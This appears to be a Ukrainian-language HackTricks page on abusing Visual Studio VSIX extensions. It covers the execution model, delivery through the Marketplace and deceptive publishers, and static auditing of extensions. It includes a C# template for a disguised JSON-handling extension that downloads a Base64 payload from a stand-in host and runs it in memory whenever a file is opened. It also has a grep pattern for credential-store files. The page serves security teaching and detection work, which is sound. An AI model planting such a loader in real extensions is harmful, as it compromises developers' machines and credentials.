# Зловживання розширеннями Visual Studio VSIX

{{#include ../banners/hacktricks-training.md}}

Розширення Visual Studio може перетворити звичайну роботу в редакторі на виконання коду від імені користувача, який увійшов у систему. Шкідливий VSIX, підроблений видавець або скомпрометоване оновлення розширення можуть дістатися цього користувача через звичайні канали встановлення. Встановлення з запитом прав адміністратора — це встановлення за згодою, а не автоматичне підвищення привілеїв.<sup>[[1]](#references)</sup>

## Модель виконання

Класичні розширення VSSDK зазвичай виконуються в `devenv.exe`. Новіша модель `VisualStudio.Extensibility` переважно запускає сучасні розширення .NET поза процесом: Visual Studio передає виклики спеціальному процесу `Microsoft.ServiceHub.Host.Extensibility`, ізолюючи стабільність IDE, але **не** обмежуючи розширення правами користувача Windows. Точна назва виконуваного файла може містити суфікс архітектури, наприклад `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Запуск під час звичайної роботи в редакторі

Замість того щоб надавати лише помітну команду меню, розширення може реалізувати `ITextViewOpenClosedListener`. Його зворотний виклик `TextViewOpenedAsync` запускається для документів, які відповідають критеріям, тоді як `TextViewExtensionConfiguration.AppliesTo` може обмежити активацію поширеним типом, наприклад JSON. Справжній форматувальник або лінтер і далі може виконувати заявлену роботу, водночас виконуючи побічну дію під час відкриття файла.<sup>[[1]](#references)[[3]](#references)</sup>

Наведений нижче скорочений шаблон демонструє важливі точки виконання; для наочності він не містить легітимного форматувальника й обробки помилок.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Завантажувач керованих збірок у пам’яті, що запускається подією</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Цей ланцюжок завантажує текст Base64, декодує його в байти assembly, завантажує їх із `MemoryStream` через `AssemblyLoadContext`, який можна вивантажити, викликає відображену `EntryPoint` без параметрів або з `string[]`, очікує завершення асинхронних точок входу та вивантажує контекст. Другий етап не записується на диск, хоча VSIX і основна DLL розширення залишаються артефактами на диску. Base64 не забезпечує автентичності чи конфіденційності; використання HTTP також дає змогу зловмиснику, який перехоплює трафік, підмінити відповідь.<sup>[[1]](#references)</sup>

Операційні варіанти включають придушення всіх винятків, щоб рекламована функція продовжувала працювати, навіть якщо етап підготовки завершується невдало, або використання `ITextViewChangedListener` для запуску після редагування. Код виконується в процесі хоста розширень і може використовувати доступні цьому користувачеві керовані API, P/Invoke, файли, облікові дані та дочірні процеси.<sup>[[1]](#references)</sup>

Про пов’язану поверхню виконання, специфічну для редактора й засновану на автоматичному завантаженні нативних плагінів, дивіться:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Зловживання довірою до Marketplace і каналів доставки

VSIX може надійти як файл, поширений напряму або через фішинг, із вебверсії Marketplace чи через вбудований браузер Marketplace у Visual Studio. Реєстрація видавця, яка переважно перевіряє унікальність і список зарезервованих слів, може дозволити створити візуально оманливі ідентичності видавців; компрометація вже довіреного видавця чи розширення ще ефективніша, оскільки воно вже має встановлену базу користувачів. Під час встановлення з Marketplace запускається Visual Studio Installer, а завантажений VSIX тимчасово розміщується в `%LOCALAPPDATA%\Temp`; `payload.vsix` також використовується легітимно, тому сама назва файла не є індикатором.<sup>[[1]](#references)</sup>

MDSec не виявила URL-протоколу Visual Studio, який безпосередньо встановлював би розширення. Оператору все одно потрібно, щоб користувач встановив або довірився VSIX, або ж необхідно скомпрометувати наявний канал розповсюдження розширення. Пакет `AllUsers` встановлюється в папку інсталяції Visual Studio і може вимагати підвищення прав, але це звичайна поведінка інсталятора, що потребує згоди, а не автоматичний шлях до прав адміністратора чи SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Статичний аудит у масштабі

Пакети VSIX зазвичай є ZIP-контейнерами, тому безпечний конвеєр перевірки Marketplace може перелічувати пакети, розпаковувати їх **без завантаження коду розширення**, аналізувати маніфести, визначати поверхні виконання та декомпілювати керовані збірки за допомогою `ilspycmd`. У першу чергу перевіряйте збірки, що належать розширенням, попередньо виключивши поширені включені залежності, а потім зіставляйте рядки, пов’язані зі сховищами облікових даних, із поведінковими кластерами, як-от читання файлів і надсилання мережею, кодування й надсилання, завантаження й виконання, доступ до диспетчера облікових даних і мережі або створення й надсилання знімків екрана.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Також інвентаризуйте native DLL, цілі MSBuild, скрипти, шаблони T4 та payload інсталяторів, а не припускайте, що всі поверхні виконання — це керований код. Порівнюйте підозрілу поведінку із заявленим призначенням у маніфесті: телеметрія та легітимні засоби оновлення можуть нагадувати ексфільтрацію або staging. Перевірка лише статичним аналізом не виявляє упакований, обфускований, динамічно розв’язаний і неактивний код, а перевірка лише найновішої версії пропускає шкідливі попередні випуски.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Огляд розширень Visual Studio](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Про VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Структура пакета VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - інструмент .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
